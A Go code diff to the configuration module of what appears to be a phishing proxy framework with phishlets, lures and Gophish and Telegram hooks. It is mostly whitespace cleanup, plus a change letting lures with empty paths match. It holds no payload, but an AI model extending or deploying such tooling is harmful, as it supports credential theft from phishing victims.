@@ -82,11 +82,11 @@ type TurnstileConfig struct {
 }
 
 type AuthConfig struct {
-	KeyHash      string    `mapstructure:"key_hash" json:"key_hash" yaml:"key_hash"`
-	IsSetup      bool      `mapstructure:"is_setup" json:"is_setup" yaml:"is_setup"`
-	IsLocked     bool      `mapstructure:"is_locked" json:"is_locked" yaml:"is_locked"`
-	SetupTime    time.Time `mapstructure:"setup_time" json:"setup_time" yaml:"setup_time"`
-	LastAccess   time.Time `mapstructure:"last_access" json:"last_access" yaml:"last_access"`
+	KeyHash    string    `mapstructure:"key_hash" json:"key_hash" yaml:"key_hash"`
+	IsSetup    bool      `mapstructure:"is_setup" json:"is_setup" yaml:"is_setup"`
+	IsLocked   bool      `mapstructure:"is_locked" json:"is_locked" yaml:"is_locked"`
+	SetupTime  time.Time `mapstructure:"setup_time" json:"setup_time" yaml:"setup_time"`
+	LastAccess time.Time `mapstructure:"last_access" json:"last_access" yaml:"last_access"`
 }
 
 type GeneralConfig struct {
@@ -187,9 +187,9 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c.cfg.UnmarshalKey(CFG_GOPHISH, &c.gophishConfig)
 
 	c.cfg.UnmarshalKey(CFG_TELEGRAM, &c.telegramConfig)
-	
+
 	c.cfg.UnmarshalKey(CFG_TURNSTILE, &c.turnstileConfig)
-	
+
 	c.cfg.UnmarshalKey("auth", &c.authConfig)
 
 	if c.general.OldIpv4 != "" {
@@ -793,7 +793,8 @@ func (c *Config) GetLureByPath(site string, host string, path string) (*Lure, er
 			pl, err := c.GetPhishlet(site)
 			if err == nil {
 				if host == l.Hostname || host == pl.GetLandingPhishHost() {
-					if l.Path == path {
+					// Match empty paths or exact path matches
+					if l.Path == "" || l.Path == path {
 						return l, nil
 					}
 				}
@@ -922,13 +923,13 @@ func (c *Config) GetConfigDir() string {
 func (c *Config) GenerateAuthKey() string {
 	const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 	const keyLength = 32
-	
+
 	key := make([]byte, keyLength)
 	for i := range key {
 		n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
 		key[i] = charset[n.Int64()]
 	}
-	
+
 	return string(key)
 }
 
@@ -943,10 +944,10 @@ func (c *Config) SetupAuth(key string) {
 	c.authConfig.IsLocked = false
 	c.authConfig.SetupTime = time.Now()
 	c.authConfig.LastAccess = time.Now()
-	
+
 	c.cfg.Set("auth", c.authConfig)
 	c.cfg.WriteConfig()
-	
+
 	log.Info("web panel authentication setup completed")
 }
 
